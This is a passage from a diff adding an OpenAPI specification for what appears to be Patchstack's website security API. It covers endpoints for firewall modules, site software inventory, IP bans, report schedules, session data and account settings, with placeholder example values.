+      tags:
+        - Firewall
+      summary: 'Enable module on all sites'
+      description: 'Enable a module on all sites.'
+      operationId: 764864a28d72a3b89192146ec74511ff
+      parameters:
+        -
+          name: module
+          in: path
+          description: 'Module id.'
+          required: true
+          example: '1'
+        -
+          name: state
+          in: path
+          description: 'State: enable or disable.'
+          required: true
+          example: enable
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The module has been attached to all sites.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You do not own this rule.'
+  '/firewall/module/{module}/group/{group}/{state}':
+    post:
+      tags:
+        - Firewall
+      summary: 'Enable module on all sites of group'
+      description: 'Enable a module on all sites of a group.'
+      operationId: e54e813e6415902e010728dfe63febc4
+      parameters:
+        -
+          name: module
+          in: path
+          description: 'Module id.'
+          required: true
+          example: '1'
+        -
+          name: group
+          in: path
+          description: 'Group id.'
+          required: true
+          example: '1'
+        -
+          name: state
+          in: path
+          description: 'State: enable or disable.'
+          required: true
+          example: enable
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The module has been attached to all sites.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You do not own this rule.'
+  '/firewall/{rule}/auto/{state}':
+    post:
+      tags:
+        - Firewall
+      summary: 'Set rule auto-assign state'
+      description: 'Set whether or not the rule should be auto-assigned to all future applications.'
+      operationId: 54d89222f8f5507eb8e799add48c4036
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+        -
+          name: state
+          in: path
+          description: 'State: enable or disable.'
+          required: true
+          example: enable
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The auto-assign state has been saved.'
+  '/firewall/module/{module}/auto/{state}':
+    post:
+      tags:
+        - Firewall
+      summary: 'Set module auto-assign state'
+      description: 'Set whether or not the module should be auto-assigned to all future applications.'
+      operationId: 85cf52643487890de81acd04649cc1ff
+      parameters:
+        -
+          name: module
+          in: path
+          description: 'Module id.'
+          required: true
+          example: '1'
+        -
+          name: state
+          in: path
+          description: 'State: enable or disable.'
+          required: true
+          example: enable
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The auto-assign state has been saved.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You do not own this rule.'
+  '/firewall/clear/{site}':
+    post:
+      tags:
+        - Firewall
+      summary: 'Site clear rules cache'
+      description: 'Tell a specific site to fetch new rules.'
+      operationId: 4370261fed06191b4ec735abf9c23b40
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: true
+  '/site/plugin/installed/{site}':
+    get:
+      tags:
+        - Sites
+      summary: 'Verify installation'
+      description: 'Verify whether or not the plugin has been installed and we have received data.'
+      operationId: d932033c445ab06e5fd2dcb6ea8eead3
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 'true'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  activated: { description: 'Activated state', type: boolean, example: true }
+                type: object
+              example:
+                activated: true
+  '/site/plugin/plugins/{site}':
+    post:
+      tags:
+        - Sites
+      summary: 'Get software'
+      description: 'Get all software of a site.'
+      operationId: 723a895ee2a90c9277d43598db314a46
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: false
+        content:
+          application/json: {  }
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                properties:
+                  plugins: { description: 'List of software of the site and its information.', type: array, items: { properties: { id: { description: 'Identifier of the software entry.', type: integer, example: 1 }, license_id: { description: 'Internal identifier.', type: integer, example: 12345 }, sw_type: { description: 'Software type', type: string, enum: [php, database, wordpress, core, plugin, theme, extension, module, drupal, joomla], example: php }, sw_name: { description: 'Name of the software.', type: string, example: PHP }, sw_cur_ver: { description: 'Current version, as reported by the site.', type: string, example: 7.4.3 }, sw_new_ver: { description: 'New version available, as reported by the site.', type: string, example: 7.4.3 }, created_at: { description: 'Creation time.', type: string, example: '2023-12-15T07:32:17.000000Z' }, updated_at: { description: 'Updated time.', type: string, example: '2023-12-15T07:32:17.000000Z' }, sw_key: { description: 'Full slug of the software.', type: string, example: null }, sw_active: { description: 'Active state of the software.', type: boolean, example: true }, sw_key_title: { description: 'Simple slug of the software.', type: string, example: null }, isVuln: { description: 'Vulnerability status of this software entry.', type: boolean, example: true }, isOutdated: { description: 'Outdated status of this software entry.', type: boolean, example: false } }, type: object } }
+                type: object
+              example:
+                plugins:
+                  - { id: 1, license_id: 12345, sw_type: database, sw_name: Database, sw_cur_ver: 10.6.16-MariaDB-log, sw_new_ver: '', created_at: '2023-11-08 14:00:29', updated_at: '2024-03-14 06:00:03', sw_key: null, sw_active: null, sw_key_title: null, sOutdated: false, isVuln: false }
+                  - { id: 2, license_id: 12345, sw_type: php, sw_name: PHP, sw_cur_ver: 8.2.21, sw_new_ver: '', created_at: '2023-11-08 14:00:29', updated_at: '2024-03-14 06:00:03', sw_key: null, sw_active: null, sw_key_title: null, sOutdated: false, isVuln: false }
+                  - { id: 3, license_id: 12345, sw_type: plugin, sw_name: 'Advanced Custom Fields', sw_cur_ver: 6.3.3, sw_new_ver: 6.3.4, created_at: '2023-11-08 14:00:29', updated_at: '2024-03-14 06:00:03', sw_key: advanced-custom-fields/acf.php, sw_active: 1, sw_key_title: advanced-custom-fields, sOutdated: true, isVuln: true }
+  '/site/plugin/recheck/{site}':
+    post:
+      tags:
+        - Sites
+      summary: 'Check activation state'
+      description: 'Recheck the firewall or plugin activation state of a site.'
+      operationId: 8c07213d381d4d7c00cb7383452fec14
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The firewall and plugin are both running on the site. Please refresh the page.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The firewall is currently still disabled. / The plugin did not send a proper ping back to our API.'
+  '/site/plugin/resync/{site}':
+    post:
+      tags:
+        - Sites
+      summary: 'Site software resync'
+      description: 'Force a resync of the site.'
+      operationId: 8312e41af888a4c5fb11ed8dccdfd1b4
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'We have forced a resync of the site.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'We could not force a resync of the site (ERR 1). / We could not force a resync of the site (ERR 2).'
+  '/site-management/{site}/get-options':
+    post:
+      tags:
+        - Sites
+      summary: 'Get plugin options'
+      description: "Gets the options of the site based on the parameters that were provided in the request payload.\nIf the request payload is empty, it will return all settings of the site."
+      operationId: 928070df689d005b52578154096f553a
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        description: 'If request body empty, return all options. Otherwise, it will return the options of which the keys match.'
+        required: false
+        content:
+          application/json: {  }
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                patchstack_firewall_ip_header: HTTP_X_FORWARDED_FOR
+  '/site-management/{site}/save-options':
+    post:
+      tags:
+        - Sites
+      summary: 'Save plugin options'
+      description: 'Saves the given options in the payload to the site,'
+      operationId: 027e257bf17851530dc90fcbe6492f57
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        description: 'The given parameters will be sent to the site for saving. E.g. patchstack_firewall_ip_header=HTTP_X_FORWARDED_FOR will set that key to the given value.'
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                PARAMETER_TO_UPDATE:
+                  description: 'The dynamic parameter to update.'
+                  type: string
+                  example: PARAMETER_VALUE
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Plugin options has been updated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error:
+                  message: 'We could not get a valid response from the website, contact support for further assistance./Connectivity error occured while trying to contact your website. Error: {ERROR}'
+  '/site-management/{site}/get-bans':
+    get:
+      tags:
+        - Sites
+      summary: 'Get banned IP addresses'
+      description: 'Retrieve the banned IP addresses that are currently banned on the site.'
+      operationId: 8aafbe3f8c746d0df2bbdd060763908d
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { ip: { description: 'The IP address.', type: integer, example: 0 }, cc: { description: 'Country code information of the IP address.', properties: { country: { description: 'The full name of the country.', type: string, example: 'United States' }, iso_code: { description: 'The ISO format of the country.', type: string, example: US } }, type: object } }
+                  type: object
+              example:
+                -
+                  ip: 123.123.123.123
+                  cc: { country: Germany, iso_code: DE }
+  '/site-management/{site}/unban-ip':
+    post:
+      tags:
+        - Sites
+      summary: 'Unban IP address'
+      description: 'Unban an IP address that is currently banned by the firewall.'
+      operationId: 5c3ec8b8e0811d3820778067621b6b21
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                ip:
+                  description: 'The IP address to unban.'
+                  type: string
+                  default: 123.123.123.123
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The IP has been unbanned.'
+  '/site-management/{site}/get-login-bans':
+    get:
+      tags:
+        - Sites
+      summary: 'Get banned login IP addresses'
+      description: 'Get the currently banned IP addresses from the login page.'
+      operationId: 951383075abf840cc9db776ea06b5b13
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { banned: { description: 'List of banned IP addresses from the login page.', type: array, items: { properties: { ip: { description: 'The IP address.', type: integer, example: 0 }, cc: { description: 'Country code information of the IP address.', properties: { country: { description: 'The full name of the country.', type: string, example: 'United States' }, iso_code: { description: 'The ISO format of the country.', type: string, example: US } }, type: object } }, type: object } } }
+                  type: object
+              example:
+                banned:
+                  - { id: '45464', ip: 123.123.123.123, date: '2024-11-14 08:46:15' }
+  '/site-management/{site}/unban-login':
+    post:
+      tags:
+        - Sites
+      summary: 'Unban banned login IP address'
+      description: 'Unban a banned login IP address.'
+      operationId: 5c51f700bbd574f27c9b1dea8eefa116
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                ip:
+                  description: ip
+                  type: string
+                  default: 123.123.123.123
+                type:
+                  description: type
+                  type: string
+                  default: unblock
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The unban has been processed.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'An invalid type or identifier was given. / Invalid id or type given.'
+  '/site/plugin/user/{site}':
+    post:
+      tags:
+        - Sites
+      summary: 'Retrieve WordPress users'
+      description: 'Retrieve a list of higher privileged users on the site.'
+      operationId: 0caa4ddfd068cd7026f02bea3e98985f
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: 'true'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { users: { description: 'List of higher privileged users on the site.', type: array, items: { properties: { id: { description: 'The unique identifier of the user.', type: integer, example: 1 }, username: { description: 'The username.', type: string, example: 'James Bond' }, email: { description: 'The email address.', type: string, example: james.bond@fbi.gov }, roles: { description: 'The roles of the user.', type: string, example: Administrator } }, type: object } } }
+                  type: object
+              example:
+                users:
+                  - { id: 1, username: test123, email: test123@mydomain.com, roles: Administrator }
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'cURL error 28: Connection timed out after 185002 milliseconds'
+  /report/stats:
+    get:
+      tags:
+        - Report
+      summary: 'Get statistics'
+      description: 'Get some simple statistics of reports and schedule count.'
+      operationId: 63b44302699fb543f42c6dc88bee8e46
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { schedules: { description: 'Number of schedules.', type: integer, example: 1 }, reports: { description: 'Number of reports generated.', type: integer, example: 1 } }
+                  type: object
+              example:
+                schedules: 1
+                reports: 1
+  '/reports/generate/{site}':
+    post:
+      tags:
+        - Report
+      summary: 'Generate report'
+      description: 'Generate a new report for the given site.'
+      operationId: bbf08a8a927b5c19ea14dda17525210b
+      parameters:
+        -
+          name: site
+          in: null
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - type
+              properties:
+                from:
+                  description: 'The from timestamp, only for developer report.'
+                  type: string
+                  example: 19-7-2024
+                to:
+                  description: 'The to timestamp, only for developer reports'
+                  type: string
+                  example: 19-12-2024
+                type:
+                  description: 'The type of report to generate'
+                  type: string
+                  enum: [snapshot, developer]
+                  example: developer
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The generation request has been sent.'
+  /report/logo/upload:
+    post:
+      tags:
+        - Report
+      summary: 'Upload global logo'
+      description: 'Upload the global logo for whitelabel users,'
+      operationId: 2453bac673ad850a2ed2bbcb899482f2
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                logo:
+                  description: 'Raw base64 encoded data of the image, starting with data:image/png;base64, or a similar image format.'
+                  type: string
+                  example: 'data:image/png;base64,<BASE64_STRING>'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { success: { description: Success, type: string, example: 'The report logo has been uploaded.' }, logo: { description: Logo, type: string, example: logo.png } }
+                  type: object
+              example:
+                success: 'The report logo has been uploaded.'
+                logo: logo.png
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Invalid image supplied. / Invalid image. Make sure it has the right extension and dimensions.'
+  /report/logo/delete:
+    delete:
+      tags:
+        - Report
+      summary: 'Delete global logo'
+      description: 'Remove the global logo.'
+      operationId: 940a13a30b6e25029739009de8f6c921
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The logo has been deleted.'
+  /report/notification:
+    post:
+      tags:
+        - Report
+      summary: 'Update notification status'
+      description: 'Update the notification status on whether or not to receive an email notification.'
+      operationId: c850691f49cb9e194b0380c3bd54c60c
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The notification setting has been updated.'
+  /report/reports:
+    post:
+      tags:
+        - Report
+      summary: 'Get generated reports'
+      description: 'Get all available generated reports.'
+      operationId: 37e847999f9b1191ae6612900780891e
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - page
+              properties:
+                page:
+                  description: 'Current paginated page.'
+                  type: integer
+                  default: 1
+                application:
+                  description: 'The unique identifier of a site to search for, if any.'
+                  type: string
+                  default: ''
+                type:
+                  description: 'The report type to search for.'
+                  type: string
+                  default: ''
+                  enum: [Developer, Snapshot, '']
+                schedule:
+                  description: 'The type of schedule to search for.'
+                  type: string
+                  default: ''
+                  enum: [Weekly, Monthly, '']
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { reports: { description: Reports, type: array, items: { properties: { id: { description: 'Unique identifier of the report.', type: integer, example: 1 }, user_id: { description: 'Unique identifier of the user of the report.', type: integer, example: 1 }, site_id: { description: 'Unique identifier of the site.', type: integer, example: 1 }, hash: { description: 'The hash of where the PDF file can be downloaded.', type: string, example: 1\/1-eb0b4a0e-2816-436c-a7ee-cfb8da415d21.pdf }, type: { description: 'The type of report.', type: string, enum: [developer, snapshot], example: developer }, has_downloaded: { description: 'If the PDF has been downloaded yet (through API).', type: integer, example: 0 }, has_notification_sent: { description: 'If a notification has been sent yet.', type: integer, example: 1 }, created_at: { description: 'Time of creation.', type: string, example: '2023-11-01 03:09:02' }, updated_at: { description: 'Time of update.', type: string, example: '2023-11-01 03:09:02' }, url: { description: 'URL of the site.', type: string, example: 'https:\/\/test.com' }, cms: { description: 'CMS of the site.', type: string, example: WordPress }, email: { description: 'Email address the PDF was sent to, if notifications are enabled.', type: string, example: test@test.com } }, type: object } }, total: { description: 'Total number of reports.', type: integer, example: 1 } }
+                  type: object
+              example:
+                reports:
+                  id: 1
+                  user_id: 1
+                  site_id: 1
+                  hash: 1\/1-eb0b4a0e-2866-436c-a7ee-cfffda415d21.pdf
+                  type: developer
+                  has_downloaded: 0
+                  has_notification_sent: 1
+                  created_at: '2023-11-01 03:09:02'
+                  updated_at: '2023-11-01 03:09:02'
+                  url: 'https:\/\/test.com'
+                  cms: WordPress
+                  email: test@test.com
+                total: 1
+  '/reports/schedule/{site}/create':
+    post:
+      tags:
+        - Report
+      summary: 'Create schedule'
+      description: 'Create a schedule for a report.'
+      operationId: 98d606f9025af6d4246f8303bec134c9
+      parameters:
+        -
+          name: site
+          in: null
+          description: 'The unique identifier of the site'
+          required: true
+          example: 1
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - typeschedule
+                - has_section_software
+                - has_section_topthreatshas_section_maintenance
+                - has_section_firewall
+              properties:
+                type:
+                  description: 'The type of report.'
+                  type: string
+                  default: Developer
+                  enum: [Developer, Snapshot]
+                schedule:
+                  description: 'The schedule type.'
+                  type: string
+                  default: Weekly
+                  enum: [Weekly, Monthly]
+                has_section_software:
+                  description: 'For enterprise/AppSumo only: whether or not to include software in developer report.'
+                  type: boolean
+                  default: true
+                has_section_topthreats:
+                  description: 'For enterprise/AppSumo only: whether or not to include top blocked threats in developer report.'
+                  type: boolean
+                  default: true
+                has_section_maintenance:
+                  description: Unused.
+                  type: boolean
+                  deprecated: true
+                has_section_firewall:
+                  description: 'For enterprise/AppSumo only: whether or not to include software in developer report.'
+                  type: boolean
+                  default: true
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The report schedule has been created.'
+  /report/schedules:
+    post:
+      tags:
+        - Report
+      summary: 'Get all schedules'
+      description: 'Get all the report generation schedules.'
+      operationId: 04448123ebb7ab925ec598ff66659b09
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - page
+              properties:
+                page:
+                  description: 'Current paginated page.'
+                  type: integer
+                  default: 1
+                application:
+                  description: 'The unique identifier of a site to search for, if any.'
+                  type: string
+                  default: ''
+                type:
+                  description: 'The report type to search for.'
+                  type: string
+                  default: ''
+                  enum: [Developer, Snapshot, '']
+                schedule:
+                  description: 'The type of schedule to search for.'
+                  type: string
+                  default: ''
+                  enum: [Weekly, Monthly, '']
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { schedules: { description: Schedules, type: array, items: { properties: { id: { description: 'Unique identifier of the schedule.', type: integer, example: 1 }, user_id: { description: 'The unique user identifier.', type: integer, example: 1 }, site_id: { description: 'The unique site identifier.', type: integer, example: 1 }, type: { description: 'The report type to search for.', type: string, default: '', enum: [Developer, Snapshot, ''] }, schedule: { description: 'The type of schedule to search for.', type: string, default: '', enum: [Weekly, Monthly, ''] }, logo: { description: 'The logo applied to the schedule.', type: string, example: null }, has_section_software: { description: 'For enterprise/AppSumo only: whether or not to include software in developer report.', type: boolean, default: true }, has_section_topthreats: { description: 'For enterprise/AppSumo only: whether or not to include top blocked threats in developer report.', type: boolean, default: true }, has_section_maintenance: { description: Unused., type: boolean, deprecated: true }, has_section_firewall: { description: 'For enterprise/AppSumo only: whether or not to include software in developer report.', type: boolean, default: true }, url: { description: 'URL of the site.', type: string, example: 'https:\/\/test.com' }, cms: { description: 'CMS of the site.', type: string, example: WordPress }, email: { description: 'Email address to send the notification to.', type: string, example: test@test.com } }, type: object } }, total: { description: Total, type: integer, example: 1 } }
+                  type: object
+              example:
+                schedules:
+                  - { id: 2, user_id: 1, site_id: 1, active: 1, schedule: monthly, type: developer, logo: null, has_section_software: 1, has_section_topthreats: 1, has_section_maintenance: 1, has_section_firewall: 1, url: 'https:\/\/test.com', cms: WordPress, email: test@test.com }
+                total: 1
+  '/report/schedule/{schedule}/update':
+    post:
+      tags:
+        - Report
+      summary: 'Update schedule'
+      description: 'Update a report schedule.'
+      operationId: 8179177e451945cb5a3d29ebb6f8906c
+      parameters:
+        -
+          name: schedule
+          in: null
+          description: 'Schedule id.'
+          required: true
+          example: 1
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - type
+                - schedule
+                - has_section_firewall
+                - has_section_software
+                - has_section_topthreats
+                - has_section_maintenance
+              properties:
+                site_id:
+                  description: 'The unique identifier of the site.'
+                  type: integer
+                type:
+                  description: 'The report type to search for.'
+                  type: string
+                  enum: [Developer, Snapshot, '']
+                schedule:
+                  description: 'The type of schedule to search for.'
+                  type: string
+                  enum: [Weekly, Monthly, '']
+                logo:
+                  description: 'If a logo should be uploaded for this schedule: raw base64 encoded data of the image, starting with data:image/png;base64, or a similar image format.'
+                  type: string
+                  example: 'data:image/png;base64,<BASE64_STRING>'
+                delete_logo:
+                  description: 'If true, will delete the current logo instead.'
+                  type: boolean
+                  default: false
+                  example: true
+                active:
+                  description: 'Active state.'
+                  type: boolean
+                  example: true
+                has_section_software:
+                  description: 'For enterprise/AppSumo only: whether or not to include software in developer report.'
+                  type: boolean
+                has_section_topthreats:
+                  description: 'For enterprise/AppSumo only: whether or not to include top blocked threats in developer report.'
+                  type: boolean
+                has_section_maintenance:
+                  description: Unused.
+                  type: boolean
+                  deprecated: true
+                has_section_firewall:
+                  description: 'For enterprise/AppSumo only: whether or not to include software in developer report.'
+                  type: boolean
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The report schedule has been updated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not the owner of the given app.'
+  '/report/schedule/{schedule}/state':
+    post:
+      tags:
+        - Report
+      summary: 'Update schedule active state'
+      description: 'Update the active state of a schedule.'
+      operationId: 5c117c01908261b102ba65b5e2d8e7bb
+      parameters:
+        -
+          name: schedule
+          in: null
+          description: 'Schedule id.'
+          required: true
+          example: 1
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - active
+              properties:
+                active:
+                  description: 'The activate state of the schedule.'
+                  type: boolean
+                  example: true
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The active state of the schedule has been updated.'
+  '/report/schedule/{schedule}/delete':
+    delete:
+      tags:
+        - Report
+      summary: 'Delete schedule'
+      description: 'Delete a schedule.'
+      operationId: 6016ae43b9fbb5f78c30312c19177e2c
+      parameters:
+        -
+          name: schedule
+          in: null
+          description: 'Schedule id.'
+          required: true
+          example: 1
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The report schedule has been updated.'
+  /logout:
+    post:
+      tags:
+        - User
+      summary: Logout
+      description: 'Log the user out.'
+      operationId: 9eb3db169be17cb52c84a828baed40d3
+      responses:
+        '200':
+          description: OK
+  /session:
+    get:
+      tags:
+        - User
+      summary: 'Get user data'
+      description: 'Get information about the current session.'
+      operationId: 2a221be8e55929fb12dbd0385db20ae5
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                user:
+                  id: 1
+                  name: Testing
+                  email: test@test.com
+                  is_admin: 0
+                  licenses: 25
+                  class: 6
+                  created_at: '2017-10-19T00:00:00.000000Z'
+                  expires_at: '2030-02-02 18:58:00'
+                  isnew: 0
+                  is_cancelled: 0
+                  site_count: 1
+                  site_included: 20
+                  is_appsumo2: 0
+                  tfa_key: MYTFAKEY
+                  tfa_enabled: 0
+                  whitelabel: { logo: 'https://website.com/mylogo.png' }
+                  bypass_addon: 0
+                  addons: { cleanup: false, whitelabel: false }
+                  newsletter: 1
+                  tracking_id: '123456789.123456789'
+                  report_logo: null
+                  report_notification: 1
+                  renew_freq: monthly
+                  owner_type: 2
+                  blocked_attacks: 10787
+                  addon_extended_api: 0
+                  termination_date: null
+                  has_made_payment: 1
+                  ga_session_id: '123456789'
+                  addon_extra_sites_count: 0
+                  addon_extra_sites_cost: null
+                  addon_per_site_cost: 0
+                  owner: null
+                  team_user: null
+                  groups: []
+                  vuln_api: { token: MYAPITOKEN, attempts: 500 }
+                  has_protection: true
+                  billing: { postal_code: '12345', payment: { type: credit_card, card: 'American Express', last_four: '0005' }, first_name: Dave, last_name: Test, company: null, address1: Test, address2: null, city: null, state: null, country: NL, vat_number: null, cost: 0, pending_cost: 0, has_pending: null, status: active, renew: '17 August 2024', addons: { api: 14900, volume: 9900 }, balance: 13, upcoming: { balance: 0, discount: 0 } }
+                  upgrade: { developer: { monthly: 0, annually: 0 }, business: { monthly: 0, annually: 0 } }
+                unread: 0
+                csrf: MYCSRFTOKEN
+                intercom_hash: MYINTERCOMHASH
+        '422':
+          description: Error.
+  '/session?groups=1':
+    get:
+      tags:
+        - User
+      summary: 'Get site groups'
+      operationId: 0b139f312dad831a37ae7244bdecd167
+      parameters:
+        -
+          name: groups
+          in: null
+          description: Groups.
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                groups:
+                  - { id: 1, title: 'All Websites', modules: [{ id: 1, title: 'Generic OWASP' }] }
+                  - { id: 2, title: 'Whitelist Rules', modules: [{ id: 1, title: 'Whitelist Rules' }] }
+                  - { id: 3, title: 'wptest.com Group Test', modules: [{ id: 1, title: 'My wptest.com Whitelist Group Test' }] }
+                  - { id: 4, title: 'Hosting Provider X', modules: [] }
+  /settings/update:
+    post:
+      tags:
+        - Settings
+      summary: 'Update user settings'
+      description: 'Update settings of the authenticated user.'
+      operationId: fbdceb0fe1a7224b381bc840e96be99d
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - email
+                - name
+                - password
+                - password_confirmation
+              properties:
+                name:
+                  description: 'New name.'
+                  type: string
+                  example: John
+                email:
+                  description: 'New email.'
+                  type: string
+                  example: test@test.com
+                password:
+                  description: 'New password.'
+                  type: string
+                  example: Test1234!@
+                password_confirmation:
+                  description: 'New password confirmation.'
+                  type: string
+                  example: Test1234!@
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Successfully updated your settings.'
+  /settings/api/request:
+    post:
+      tags:
+        - Settings
+      summary: 'Request vulnerability database API access'
+      description: 'Request access to the vulnerability database API.'
+      operationId: a99eafb40d19f348b10d7df734e66b0e
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - reason
+              properties:
+                reason:
+                  description: 'Reason for requesting access.'
+                  type: string
+                  example: 'The reason is..'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The request has been sent.'
+  /settings/update/newsletter:
+    post:
+      tags:
+        - Settings
+      summary: 'Update newsletter status'
+      description: 'Update the newsletter status of the user.'
+      operationId: b58dc8a18ba96731e4f54ce18b8e39c2
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - newsletter
+              properties:
+                newsletter:
+                  description: 'Should receive newsletter.'
+                  type: boolean
+                  example: true
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The newsletter setting has been adjusted.'
+  /settings/update/slack:
+    post:
+      tags:
+        - Settings
+      summary: 'Update Slack channel settings'
+      description: 'Update the Slack channel settings.'
+      operationId: 27cc656a302891ae184a27dea70a17ef
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - channel
+              properties:
+                channel:
+                  description: 'The channel name to send the message to.'
+                  type: string
+                  example: '#patchstack-alerts'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Successfully updated your Slack settings.'
+  /settings/update/tfa:
+    post:
+      tags:
+        - Settings
+      summary: 'Save 2FA settings'
+      description: 'Save the 2FA settings of the user.'
+      operationId: c8efb541a31effdf176075a074d9d30c
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - enabled
+              properties:
+                enabled:
+                  description: 'Enabled state.'
+                  type: boolean
+                  example: true
+                code:
+                  description: 'Code to match against the secret key.'
+                  type: integer
+                  example: 334564
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Two-factor authentication has been toggled.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Invalid tfa code.'
+  /settings/slack:
+    get:
+      tags:
+        - Settings
+      summary: 'Get Slack settings'
